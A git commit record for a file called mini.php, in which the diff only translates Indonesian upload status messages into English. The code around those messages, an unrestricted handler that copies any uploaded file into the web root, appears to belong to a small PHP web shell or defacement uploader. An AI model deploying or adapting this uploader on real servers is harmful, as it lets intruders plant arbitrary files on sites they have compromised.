be091955f6f0f6fe4c09b628bb36f7c44ed4c4e7
mrx325 <rone8989@gmail.com>
2024-07-22 17:03:47 +0200

    Update mini.php

--- mini.php
+++ mini.php
@@ -12,15 +12,15 @@ if(isset($_POST['upload'])) {
 	if(is_writable($root)) {
 		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
 			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+			echo "success upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
 		} else {
-			echo "gagal upload di document root.";
+			echo "Failed to upload at document root.";
 		}
 	} else {
 		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
-			echo "sukses upload <b>$files</b> di folder ini";
+			echo "successful upload <b>$files</b> to folder ini";
 		} else {
-			echo "gagal upload";
+			echo "upload failed";
 		}
 	}
 }
